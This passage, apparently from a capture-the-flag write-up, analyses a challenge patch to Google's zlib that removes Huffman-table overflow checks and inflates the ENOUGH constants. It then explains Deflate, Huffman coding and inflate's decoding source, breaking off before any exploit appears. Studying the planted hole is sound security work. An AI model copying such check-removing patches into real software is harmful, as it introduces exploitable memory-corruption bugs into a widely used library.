-            if ((type == LENS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_LENS) ||
-                (type == DISTS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_DISTS))
-                return 1;
 
             /* point entry in root table to sub-table */
             low = huff &amp;amp; mask;
diff --git a/inftrees.h b/inftrees.h
index 396f74b..42c2c44 100644
--- a/inftrees.h
+++ b/inftrees.h
@@ -35,19 +35,11 @@ typedef struct {
     01000000 - invalid code
  */
 
-/* Maximum size of the dynamic table.  The maximum number of code structures is
-   1444, which is the sum of 852 for literal/length codes and 592 for distance
-   codes.  These values were found by exhaustive searches using the program
-   examples/enough.c found in the zlib distribution.  The arguments to that
-   program are the number of symbols, the initial root table size, and the
-   maximum bit length of a code.  "enough 286 9 15" for literal/length codes
-   returns 852, and "enough 30 6 15" for distance codes returns 592. The
-   initial root table size (9 or 6) is found in the fifth argument of the
-   inflate_table() calls in inflate.c and infback.c.  If the root table size is
-   changed, then these maximum sizes would be need to be recalculated and
-   updated. */
-#define ENOUGH_LENS 852
-#define ENOUGH_DISTS 592
+/* Memory/speed tradeoff. Alocate more-than-ENOUGH space for LENS and
+   DISTS so we can remove overflow checks from `inflate`.
+*/
+#define ENOUGH_LENS (1 &amp;lt;&amp;lt; 15)
+#define ENOUGH_DISTS (1 &amp;lt;&amp;lt; 15)
 #define ENOUGH (ENOUGH_LENS+ENOUGH_DISTS)
 
 /* Type of code to build for inflate_table() */
-- 
2.50.0.rc0.642.g800a2b2222-goog
&lt;/code&gt;&lt;p&gt;The Google-zlib source shipped with the challenge contains a &lt;code&gt;0001-google-zlib-Increase-Huffman-Table-Size.patch&lt;/code&gt;. From that patch we can see the code has been modified as above.&lt;/p&gt;&lt;p&gt;The patch removes some checks in &lt;code&gt;inftrees.c&lt;/code&gt; and greatly increases the values of &lt;code&gt;ENOUGH_LENS&lt;/code&gt; and &lt;code&gt;ENOUGH_DISTS&lt;/code&gt;. From the comments, the patch increases the sizes of Huffman tables and removes related checks to achieve a memory/speed tradeoff optimization. At this point we don’t yet know exactly what issues this introduces, but it’s clear the vulnerability will be related to Huffman tables and Huffman coding.&lt;/p&gt;&lt;p&gt;Before analyzing the code, let’s review the Deflate compression algorithm. Deflate uses Huffman coding and the LZ77 algorithm to compress data.&lt;/p&gt;&lt;p&gt;The principle of the LZ77 algorithm is very simple: repeated data is replaced by (length, distance) pairs.&lt;/p&gt;&lt;code&gt;ABCDEEABCDFF -&amp;gt; ABCDEE(4,6)FF&lt;/code&gt;&lt;p&gt;The length is how many bytes to copy, and the distance is how far back from the current position the source data lies.&lt;/p&gt;&lt;p&gt;Huffman coding is a bit more involved. The basic idea is to replace original data with compressed bit sequences. While the minimum unit of data is typically a byte (8 bits), replacing values with shorter bit sequences reduces size.&lt;/p&gt;&lt;code&gt;ABABAAAABBBB (12 Byte, 96bit) -&amp;gt; 010100001111 ( 1.5 Byte, 12bit)&lt;/code&gt;&lt;p&gt;In this example there are only two symbols, A and B, which can be encoded with 1-bit Huffman codes (0 and 1). If there are more than two symbols, you obviously cannot compress them all with 1-bit codes.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111

ABCDABCEABC -&amp;gt; 000110110000110111&lt;/code&gt;&lt;quote&gt;&lt;p&gt;As shown, Huffman codes depend on the data being compressed, so to decode the compressed data, you need a table mapping {Huffman code : actual value}.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;A Huffman code cannot be the prefix of another Huffman code. For example, if 111 is a code, then 11 cannot be a code; since codes have variable length, a prefix collision like 1110 would be ambiguous—unclear whether it’s 111 + 0 or 11 + 10.&lt;/p&gt;&lt;p&gt;Also, the minimum and maximum code lengths vary depending on the number of distinct data values. Huffman coding assigns shorter codes (e.g., 2 bits) to high-frequency values (A, B, C) and longer codes (e.g., 3 bits) to low-frequency values (D, E) to compress effectively.&lt;/p&gt;&lt;p&gt;Additionally, consider this: if Deflate generates efficient Huffman codes tailored to the input, then the decoder needs the corresponding Huffman table to decode. Therefore, Deflate uses either fixed Huffman tables or dynamic Huffman tables depending on the situation.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;Fixed Huffman table&lt;/item&gt;&lt;lb/&gt;Predefined in Deflate/Inflate. It doesn’t always give the most efficient compression for the data, but you don’t need to include a Huffman table in the final compressed stream.&lt;item&gt;Dynamic Huffman table&lt;/item&gt;&lt;lb/&gt;Performs optimal Huffman coding for the given data, and includes in the final compressed data the Huffman table necessary to decode it.&lt;/quote&gt;&lt;p&gt;Let’s elaborate on “including the Huffman table in the final compressed data.” In the standard implementation, the Huffman table can be represented using only code lengths.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111&lt;/code&gt;&lt;p&gt;Rather than storing the entire codes as above, you can store just the code lengths:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2
B -&amp;gt; 2
C -&amp;gt; 2
D -&amp;gt; 3
E -&amp;gt; 3&lt;/code&gt;&lt;p&gt;Since actual Huffman codes have lengths in the range 3–15 bits, storing only lengths reduces the size of the embedded Huffman tables.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Separately from using code lengths to compress the Huffman table, Google‑zlib compresses the lengths themselves again using Huffman coding. We’ll discuss this in more detail during the source analysis below.&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;huffman_table['A'] = 2
huffman_table['B'] = 2
huffman_table['C'] = 2
huffman_table['D'] = 3
huffman_table['E'] = 3&lt;/code&gt;&lt;p&gt;This works for a simple reason. A Huffman table is an array indexed by the original symbol. Assign the first 2-bit code 00 to A; then B gets 01, C gets 10, and so on. Using only lengths and order, all codes are recoverable. In other words, if Deflate assigns codes in order, Inflate can reconstruct them from just the lengths.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Deflate uses Huffman coding not only for literal values (0–255), but also for the LZ77 (length, distance) pairs.&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;int ZEXPORT inflate(z_streamp strm, int flush) {
    struct inflate_state FAR *state;
    z_const unsigned char FAR *next;    /* next input */
    unsigned char FAR *put;     /* next output */
    unsigned have, left;        /* available input and output */
    unsigned long hold;         /* bit buffer */
    unsigned bits;              /* bits in bit buffer */
    unsigned in, out;           /* save starting available input and output */
    unsigned copy;              /* number of stored or match bytes to copy */
    unsigned char FAR *from;    /* where to copy match bytes from */
    code here;                  /* current decoding table entry */
    code last;                  /* parent table entry */
    unsigned len;               /* length to copy for repeats, bits to drop */
    int ret;                    /* return code */
#ifdef GUNZIP
    unsigned char hbuf[4];      /* buffer for gzip header crc calculation */
#endif
    static const unsigned short order[19] = /* permutation of code lengths */
        {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};

    if (inflateStateCheck(strm) || strm-&amp;gt;next_out == Z_NULL ||
        (strm-&amp;gt;next_in == Z_NULL &amp;amp;&amp;amp; strm-&amp;gt;avail_in != 0))
        return Z_STREAM_ERROR;

    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    if (state-&amp;gt;mode == TYPE) state-&amp;gt;mode = TYPEDO;      /* skip check */
    LOAD();
    in = have;
    out = left;
    ret = Z_OK;
    for (;;)
        switch (state-&amp;gt;mode) {
        case HEAD:
            if (state-&amp;gt;wrap == 0) {
                state-&amp;gt;mode = TYPEDO;
                break;
            }
            ...&lt;/code&gt;&lt;p&gt;&lt;code&gt;inflate&lt;/code&gt; is a virtual finite-state machine. It treats the compressed data stream (&lt;code&gt;strm&lt;/code&gt;) as opcodes and executes like a VM. Since &lt;code&gt;inflateInit2_&lt;/code&gt; sets &lt;code&gt;state-&amp;gt;mode = HEAD&lt;/code&gt;, it transitions to &lt;code&gt;state-&amp;gt;mode = TYPEDO&lt;/code&gt;, and then hits the &lt;code&gt;case TYPEDO&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;/* Load registers with state in inflate() for speed */
#define LOAD() \
    do { \
        put = strm-&amp;gt;next_out; \
        left = strm-&amp;gt;avail_out; \
        next = strm-&amp;gt;next_in; \
        have = strm-&amp;gt;avail_in; \
        hold = state-&amp;gt;hold; \
        bits = state-&amp;gt;bits; \
    } while (0)

/* Restore state from registers in inflate() */
#define RESTORE() \
    do { \
        strm-&amp;gt;next_out = put; \
        strm-&amp;gt;avail_out = left; \
        strm-&amp;gt;next_in = next; \
        strm-&amp;gt;avail_in = have; \
        state-&amp;gt;hold = hold; \
        state-&amp;gt;bits = bits; \
    } while (0)&lt;/code&gt;&lt;quote&gt;&lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt;: end pointer of the decompressed output buffer that’s been filled so far&lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt;: remaining size of the decompression buffer&lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt;: end pointer of the processed input data&lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt;: remaining number of input bytes to process&lt;code&gt;state-&amp;gt;hold&lt;/code&gt;: buffer used for bit operations&lt;code&gt;state-&amp;gt;bits&lt;/code&gt;: current bit length stored in&lt;code&gt;state-&amp;gt;hold&lt;/code&gt;&lt;/quote&gt;&lt;p&gt;Before the main loop, let’s note some macros and variables used by Inflate. Members of the &lt;code&gt;strm&lt;/code&gt; structure don’t benefit from register optimization, so these macros copy them into locals for faster operations.&lt;/p&gt;&lt;code&gt;/* Get a byte of input into the bit accumulator, or return from inflate()
   if there is no input available. */
#define PULLBYTE() \
    do { \
        if (have == 0) goto inf_leave; \
        have--; \
        hold += (unsigned long)(*next++) &amp;lt;&amp;lt; bits; \
        bits += 8; \
    } while (0)

/* Assure that there are at least n bits in the bit accumulator.  If there is
   not enough available input to do that, then return from inflate(). */
#define NEEDBITS(n) \
    do { \
        while (bits &amp;lt; (unsigned)(n)) \
            PULLBYTE(); \
    } while (0)

/* Return the low n bits of the bit accumulator (n &amp;lt; 16) */
#define BITS(n) \
    ((unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; (n)) - 1))

/* Remove n bits from the bit accumulator */
#define DROPBITS(n) \
    do { \
        hold &amp;gt;&amp;gt;= (n); \
        bits -= (unsigned)(n); \
    } while (0)&lt;/code&gt;&lt;p&gt;Unlike byte-oriented data, compressed data is processed at bit granularity because of packing and Huffman coding. The Inflate implementation uses macros like these to fill a bit buffer (&lt;code&gt;hold&lt;/code&gt;) and manipulate it bitwise.&lt;/p&gt;&lt;p&gt;The basic logic is: use &lt;code&gt;NEEDBITS&lt;/code&gt; to pull bits from &lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt; (&lt;code&gt;next&lt;/code&gt;) into &lt;code&gt;state-&amp;gt;hold&lt;/code&gt; (&lt;code&gt;hold&lt;/code&gt;), decreasing &lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt; (&lt;code&gt;have&lt;/code&gt;) accordingly. Then extract as many bits as needed with &lt;code&gt;BITS&lt;/code&gt;, and drop consumed bits with &lt;code&gt;DROPBITS&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Using this bit-level handling, the code decodes the compressed data and appends the decoded bytes to &lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt; (&lt;code&gt;put&lt;/code&gt;), decreasing &lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt; (&lt;code&gt;left&lt;/code&gt;) by the number of bytes written.&lt;/p&gt;&lt;code&gt;        case TYPEDO:
            if (state-&amp;gt;last) {
                BYTEBITS();
                state-&amp;gt;mode = CHECK;
                break;
            }
            NEEDBITS(3);
            state-&amp;gt;last = BITS(1);
            DROPBITS(1);
            switch (BITS(2)) {
            case 0:                             /* stored block */
                Tracev((stderr, "inflate:     stored block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = STORED;
                break;
            case 1:                             /* fixed block */
                fixedtables(state);
                Tracev((stderr, "inflate:     fixed codes block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = LEN_;             /* decode codes */
                if (flush == Z_TREES) {
                    DROPBITS(2);
                    goto inf_leave;
                }
                break;
            case 2:                             /* dynamic block */
                Tracev((stderr, "inflate:     dynamic codes block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = TABLE;
                break;
            case 3:
                strm-&amp;gt;msg = (z_const char *)"invalid block type";
                state-&amp;gt;mode = BAD;
            }
            DROPBITS(2);
            break;&lt;/code&gt;&lt;p&gt;Back in &lt;code&gt;inflate&lt;/code&gt;, compressed data is processed in blocks, starting at &lt;code&gt;case TYPEDO&lt;/code&gt;. After ensuring at least 3 bits in the buffer (&lt;code&gt;NEEDBITS(3)&lt;/code&gt;), it reads 1 bit with &lt;code&gt;BITS(1)&lt;/code&gt; to set &lt;code&gt;state-&amp;gt;last&lt;/code&gt;, which indicates whether this block is the last one. It then drops that bit and uses the next two bits to select the block type.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;stored block (0): a block of uncompressed data. When&lt;/item&gt;&lt;code&gt;state-&amp;gt;mode = STORED&lt;/code&gt;, it will directly copy from&lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt;to&lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt;.&lt;item&gt;fixed codes block (1): data compressed with the fixed Huffman table.&lt;/item&gt;&lt;code&gt;fixedtables(state)&lt;/code&gt;builds the fixed table, then&lt;code&gt;state-&amp;gt;mode = LEN_&lt;/code&gt;moves to the Huffman decoding path.&lt;item&gt;dynamic codes block (2): data compressed with a dynamic Huffman table.&lt;/item&gt;&lt;code&gt;state-&amp;gt;mode = TABLE&lt;/code&gt;reads dynamic table info from the compressed stream, constructs the dynamic Huffman table, then proceeds to decode.&lt;/quote&gt;&lt;p&gt;Blocks have the following forms:&lt;/p&gt;&lt;code&gt;[0(stored_bock) + state-&amp;gt;last + length to copy + uncompressed bytes to copy]
[1(fixed codes block) + state-&amp;gt;last + compressed data (Huffman codes) + Huffman code for End of Block]
[2(Dynamic codes block) + state-&amp;gt;last + dynamic table info (Code Huffman table + compressed Literal/Length and Distance Huffman tables) + compressed data (Huffman codes) + Huffman code for End of Block ]&lt;/code&gt;&lt;p&gt;The compressed stream consists of one or more blocks, and &lt;code&gt;inflate&lt;/code&gt; decodes each according to the code above.&lt;/p&gt;&lt;code&gt;        case TABLE:
            NEEDBITS(14);
            state-&amp;gt;nlen = BITS(5) + 257;
            DROPBITS(5);
            state-&amp;gt;ndist = BITS(5) + 1;
            DROPBITS(5);
            state-&amp;gt;ncode = BITS(4) + 4;
            DROPBITS(4);
#ifndef PKZIP_BUG_WORKAROUND
            if (state-&amp;gt;nlen &amp;gt; 286 || state-&amp;gt;ndist &amp;gt; 30) {
                strm-&amp;gt;msg = (z_const char *)"too many length or distance symbols";
                state-&amp;gt;mode = BAD;
                break;
            }
#endif
            Tracev((stderr, "inflate:       table sizes ok\n"));
            state-&amp;gt;have = 0;
            state-&amp;gt;mode = LENLENS;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;Let’s look at how a dynamic Huffman table is built. As noted earlier, a dynamic codes block includes a Code Huffman table, and compressed Literal/Length and Distance tables. The code above reads the lengths for those three tables.&lt;/p&gt;&lt;p&gt;The Literal/Length table contains codes for literal bytes (A, B, …) and for LZ77 lengths; the Distance table holds codes for LZ77 distances. Using these two tables, the decoder performs Huffman and LZ77 decoding. So what is the Code Huffman table? The Literal/Length and Distance tables are stored compressed in the stream—again via Huffman coding. The Code Huffman table is the dynamic Huffman table used to decode the Huffman tables (lengths) themselves.&lt;/p&gt;&lt;code&gt;        case LENLENS:
            while (state-&amp;gt;have &amp;lt; state-&amp;gt;ncode) {
                NEEDBITS(3);
                state-&amp;gt;lens[order[state-&amp;gt;have++]] = (unsigned short)BITS(3);
                DROPBITS(3);
            }
            while (state-&amp;gt;have &amp;lt; 19)
                state-&amp;gt;lens[order[state-&amp;gt;have++]] = 0;
            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 7;
            ret = inflate_table(CODES, state-&amp;gt;lens, 19, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid code lengths set";
                state-&amp;gt;mode = BAD;
                break;
            }
            Tracev((stderr, "inflate:       code lengths ok\n"));
            state-&amp;gt;have = 0;
            state-&amp;gt;mode = CODELENS;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;First, we read the Code Huffman table lengths. We loop &lt;code&gt;state-&amp;gt;ncode&lt;/code&gt; times and read 3 bits each time into &lt;code&gt;state-&amp;gt;lens&lt;/code&gt;. These 3-bit values are code lengths—the Huffman table is represented by lengths, not the full bit patterns, as discussed earlier. Thus, &lt;code&gt;state-&amp;gt;lens&lt;/code&gt; records the Code Huffman table’s code lengths in the &lt;code&gt;order&lt;/code&gt; permutation.&lt;/p&gt;&lt;code&gt;static const unsigned short order[19] = /* permutation of code lengths */
        {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};&lt;/code&gt;&lt;p&gt;Here, &lt;code&gt;order&lt;/code&gt; reduces the size of the encoded Code Huffman table. The Code table decodes original values 0–18. Storing lengths for all 19 values would be inefficient.&lt;/p&gt;&lt;p&gt;Typically, codes are used more frequently in the same order as &lt;code&gt;order&lt;/code&gt;. If we stored lengths in plain 0–18 order, we’d need to write zeros for many unused values (e.g., 0–15) before the frequently used 16, 17, 18. By ordering them as above, we can store just the lengths for the frequently used codes and leave the rest implicit. The code reflects this: it reads &lt;code&gt;state-&amp;gt;ncode&lt;/code&gt; lengths, and sets the remaining entries to zero.&lt;/p&gt;&lt;p&gt;We then set &lt;code&gt;state-&amp;gt;next&lt;/code&gt; to point into &lt;code&gt;state-&amp;gt;codes&lt;/code&gt;, and call &lt;code&gt;inflate_table&lt;/code&gt; to build the Huffman table. The resulting table is written at &lt;code&gt;state-&amp;gt;next&lt;/code&gt; (&lt;code&gt;state-&amp;gt;lencode&lt;/code&gt;). We’ll cover &lt;code&gt;inflate_table&lt;/code&gt; shortly. For now, note the parameters: &lt;code&gt;CODES&lt;/code&gt; (build the Code table), &lt;code&gt;state-&amp;gt;lens&lt;/code&gt; (length array), &lt;code&gt;19&lt;/code&gt; (number of symbols, 0–18), &lt;code&gt;&amp;amp;(state-&amp;gt;next)&lt;/code&gt; (output pointer for the constructed table), &lt;code&gt;&amp;amp;(state-&amp;gt;lenbits)&lt;/code&gt; (table index bit width—initially 7, but may be adjusted by &lt;code&gt;inflate_table&lt;/code&gt;), and &lt;code&gt;state-&amp;gt;work&lt;/code&gt; (a temporary array for sorting).&lt;/p&gt;&lt;code&gt;        case CODELENS:
            while (state-&amp;gt;have &amp;lt; state-&amp;gt;nlen + state-&amp;gt;ndist) {
                for (;;) {
                    here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];
                    if ((unsigned)(here.bits) &amp;lt;= bits) break;
                    PULLBYTE();
                }
                if (here.val &amp;lt; 16) {
                    DROPBITS(here.bits);
                    state-&amp;gt;lens[state-&amp;gt;have++] = here.val;
                }
                else {
                    if (here.val == 16) {
                        NEEDBITS(here.bits + 2);
                        DROPBITS(here.bits);
                        if (state-&amp;gt;have == 0) {
                            strm-&amp;gt;msg = (z_const char *)"invalid bit length repeat";
                            state-&amp;gt;mode = BAD;
                            break;
                        }
                        len = state-&amp;gt;lens[state-&amp;gt;have - 1];
                        copy = 3 + BITS(2);
                        DROPBITS(2);
                    }
                    else if (here.val == 17) {
                        NEEDBITS(here.bits + 3);
                        DROPBITS(here.bits);
                        len = 0;
                        copy = 3 + BITS(3);
                        DROPBITS(3);
                    }
                    else {
                        NEEDBITS(here.bits + 7);
                        DROPBITS(here.bits);
                        len = 0;
                        copy = 11 + BITS(7);
                        DROPBITS(7);
                    }
                    if (state-&amp;gt;have + copy &amp;gt; state-&amp;gt;nlen + state-&amp;gt;ndist) {
                        strm-&amp;gt;msg = (z_const char *)"invalid bit length repeat";
                        state-&amp;gt;mode = BAD;
                        break;
                    }
                    while (copy--)
                        state-&amp;gt;lens[state-&amp;gt;have++] = (unsigned short)len;
                }
            }

            /* handle error breaks in while */
            if (state-&amp;gt;mode == BAD) break;

            /* check for end-of-block code (better have one) */
            if (state-&amp;gt;lens[256] == 0) {
                strm-&amp;gt;msg = (z_const char *)"invalid code -- missing end-of-block";
                state-&amp;gt;mode = BAD;
                break;
            }

            /* build code tables -- note: do not change the lenbits or distbits
               values here (9 and 6) without reading the comments in inftrees.h
               concerning the ENOUGH constants, which depend on those values */
            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 9;
            ret = inflate_table(LENS, state-&amp;gt;lens, state-&amp;gt;nlen, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/lengths set";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;distbits = 6;
            ret = inflate_table(DISTS, state-&amp;gt;lens + state-&amp;gt;nlen, state-&amp;gt;ndist,
                            &amp;amp;(state-&amp;gt;next), &amp;amp;(state-&amp;gt;distbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid distances set";
                state-&amp;gt;mode = BAD;
                break;
            }
            Tracev((stderr, "inflate:       codes ok\n"));
            state-&amp;gt;mode = LEN_;
            if (flush == Z_TREES) goto inf_leave;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;Once the Code table is built, we decode the compressed lengths of the Literal/Length and Distance tables. We read &lt;code&gt;state-&amp;gt;lenbits&lt;/code&gt; bits and use the Code table &lt;code&gt;state-&amp;gt;lencode&lt;/code&gt; to decode entries, retrieving a &lt;code&gt;code&lt;/code&gt; struct from the table.&lt;/p&gt;&lt;p&gt;Values 0–18 decoded via the Code table are not literal decoded bytes. Based on the code, they behave as follows:&lt;/p&gt;&lt;quote&gt;&lt;item&gt;0–15: literal code lengths 0–15 directly&lt;/item&gt;&lt;item&gt;16: repeat previous length 3–6 times&lt;/item&gt;&lt;item&gt;17: repeat length 0, 3–10 times&lt;/item&gt;&lt;item&gt;18: repeat length 0, 11–138 times&lt;/item&gt;&lt;/quote&gt;&lt;p&gt;Here “original value” refers to the value decoded by Huffman coding, not necessarily the final decompressed byte. Some values (0–15) correspond to actual lengths, others (16–18) are special symbols.&lt;/p&gt;&lt;code&gt;code here;&lt;/code&gt;&lt;p&gt;We’ll explain this struct in the Huffman table construction section. Depending on its members, various actions occur to ultimately decode each value.&lt;/p&gt;&lt;p&gt;As before, we call &lt;code&gt;inflate_table&lt;/code&gt; to build the final &lt;code&gt;state-&amp;gt;lencode&lt;/code&gt; and &lt;code&gt;state-&amp;gt;distcode&lt;/code&gt; tables for Literal/Length and Distance respectively.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The Code table is no longer needed, so overwriting&lt;/p&gt;&lt;code&gt;state-&amp;gt;lencode&lt;/code&gt;is fine.&lt;/quote&gt;&lt;code&gt;        case LEN:
            if (have &amp;gt;= 6 &amp;amp;&amp;amp; left &amp;gt;= 258) {
                RESTORE();
                inflate_fast(strm, out);
                LOAD();
                if (state-&amp;gt;mode == TYPE)
                    state-&amp;gt;back = -1;
                break;
            }
            state-&amp;gt;back = 0;
            for (;;) {
                here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];
                if ((unsigned)(here.bits) &amp;lt;= bits) break;
                PULLBYTE();
            }
            if (here.op &amp;amp;&amp;amp; (here.op &amp;amp; 0xf0) == 0) {
                last = here;
                for (;;) {
                    here = state-&amp;gt;lencode[last.val +
                            (BITS(last.bits + last.op) &amp;gt;&amp;gt; last.bits)];
                    if ((unsigned)(last.bits + here.bits) &amp;lt;= bits) break;
                    PULLBYTE();
                }
                DROPBITS(last.bits);
                state-&amp;gt;back += last.bits;
            }
            DROPBITS(here.bits);
            state-&amp;gt;back += here.bits;
            state-&amp;gt;length = (unsigned)here.val;
            if ((int)(here.op) == 0) {
                Tracevv((stderr, here.val &amp;gt;= 0x20 &amp;amp;&amp;amp; here.val &amp;lt; 0x7f ?
                        "inflate:         literal '%c'\n" :
                        "inflate:         literal 0x%02x\n", here.val));
                state-&amp;gt;mode = LIT;
                break;
            }
            if (here.op &amp;amp; 32) {
                Tracevv((stderr, "inflate:         end of block\n"));
                state-&amp;gt;back = -1;
                state-&amp;gt;mode = TYPE;
                break;
            }
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;extra = (unsigned)(here.op) &amp;amp; 15;
            state-&amp;gt;mode = LENEXT;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;We now enter the decoding process. Again, we fetch a &lt;code&gt;code&lt;/code&gt; from the table and take actions based on its fields to decode the original value.&lt;/p&gt;&lt;code&gt;        case LIT:
            if (left == 0) goto inf_leave;
            *put++ = (unsigned char)(state-&amp;gt;length);
            left--;
            state-&amp;gt;mode = LEN;
            break;&lt;/code&gt;&lt;p&gt;A quick check shows that when &lt;code&gt;here.op == 0&lt;/code&gt;, we switch to &lt;code&gt;state-&amp;gt;mode = LIT&lt;/code&gt; and append &lt;code&gt;here.val&lt;/code&gt; (the literal byte) to &lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt; (&lt;code&gt;put&lt;/code&gt;). Also, &lt;code&gt;here.bits&lt;/code&gt; is the number of bits consumed to decode that symbol; i.e., it’s the code length, and the decoder uses &lt;code&gt;DROPBITS(here.bits)&lt;/code&gt; to consume bits. This is standard Huffman decoding. But there are other decoding forms depending on &lt;code&gt;here.op&lt;/code&gt;—we’ll explain this in the table construction section.&lt;/p&gt;&lt;code&gt;        case LEN:
            if (have &amp;gt;= 6 &amp;amp;&amp;amp; left &amp;gt;= 258) {
                RESTORE();
                inflate_fast(strm, out);
                LOAD();
                if (state-&amp;gt;mode == TYPE)
                    state-&amp;gt;back = -1;
                break;
            }&lt;/code&gt;&lt;p&gt;Back to the code snippet above. If &lt;code&gt;have&lt;/code&gt; and &lt;code&gt;left&lt;/code&gt; are large enough, &lt;code&gt;inflate&lt;/code&gt; calls &lt;code&gt;inflate_fast&lt;/code&gt; for high-speed decoding. The in-function Huffman decoding is slower because it transitions through VM-like states; &lt;code&gt;inflate_fast&lt;/code&gt; operates with full buffers and fewer checks. Therefore, &lt;code&gt;inflate_fast&lt;/code&gt; requires sufficiently large input/output buffers to be safe.&lt;/p&gt;&lt;code&gt;int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
                                unsigned codes, code FAR * FAR *table,
                                unsigned FAR *bits, unsigned short FAR *work) {&lt;/code&gt;&lt;p&gt;Let’s revisit &lt;code&gt;inflate_table&lt;/code&gt;’s parameters:&lt;/p&gt;&lt;quote&gt;&lt;code&gt;codetype type&lt;/code&gt;: table type (Code, Literal/Length, Distance)&lt;/quote&gt;&lt;code&gt;unsigned short FAR *lens&lt;/code&gt;: array of code lengths&lt;code&gt;unsigned codes&lt;/code&gt;: number of symbols (table entries)&lt;code&gt;code FAR * FAR *table&lt;/code&gt;: output pointer to the constructed table&lt;code&gt;unsigned FAR *bits&lt;/code&gt;: pointer to the number of index bits for the table (may be adjusted)&lt;code&gt;unsigned short FAR *work&lt;/code&gt;: scratch array for sorting, etc.&lt;code&gt;typedef struct {
    unsigned char op;           /* operation, extra bits, table bits */
    unsigned char bits;         /* bits in this part of the code */
    unsigned short val;         /* offset in table or code value */
} code;

/* op values as set by inflate_table():
    00000000 - literal
    0000tttt - table link, tttt != 0 is the number of table index bits
    0001eeee - length or distance, eeee is the number of extra bits
    01100000 - end of block
    01000000 - invalid code
 */&lt;/code&gt;&lt;p&gt;Now, the &lt;code&gt;code&lt;/code&gt; struct. The Huffman table is an array of &lt;code&gt;code&lt;/code&gt; structs; &lt;code&gt;op&lt;/code&gt; determines how to decode, &lt;code&gt;bits&lt;/code&gt; is the code length, and &lt;code&gt;val&lt;/code&gt; holds the value. As the comment indicates, these fields can play different roles depending on &lt;code&gt;op&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;
    /* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */
    for (len = 0; len &amp;lt;= MAXBITS; len++)
        count[len] = 0;
    for (sym = 0; sym &amp;lt; codes; sym++)
        count[lens[sym]]++;

    /* bound code lengths, force root to be within code lengths */
    root = *bits;
    for (max = MAXBITS; max &amp;gt;= 1; max--)
        if (count[max] != 0) break;
    if (root &amp;gt; max) root = max;
    if (max == 0) {                     /* no symbols to code at all */
        here.op = (unsigned char)64;    /* invalid code marker */
        here.bits = (unsigned char)1;
        here.val = (unsigned short)0;
        *(*table)++ = here;             /* make a table to force an error */
        *(*table)++ = here;
        *bits = 1;
        return 0;     /* no symbols, but wait for decoding to report error */
    }
    for (min = 1; min &amp;lt; max; min++)
        if (count[min] != 0) break;
    if (root &amp;lt; min) root = min;

    /* generate offsets into symbol table for each length for sorting */
    offs[1] = 0;
    for (len = 1; len &amp;lt; MAXBITS; len++)
        offs[len + 1] = offs[len] + count[len];

    /* sort symbols by length, by symbol order within each length */
    for (sym = 0; sym &amp;lt; codes; sym++)
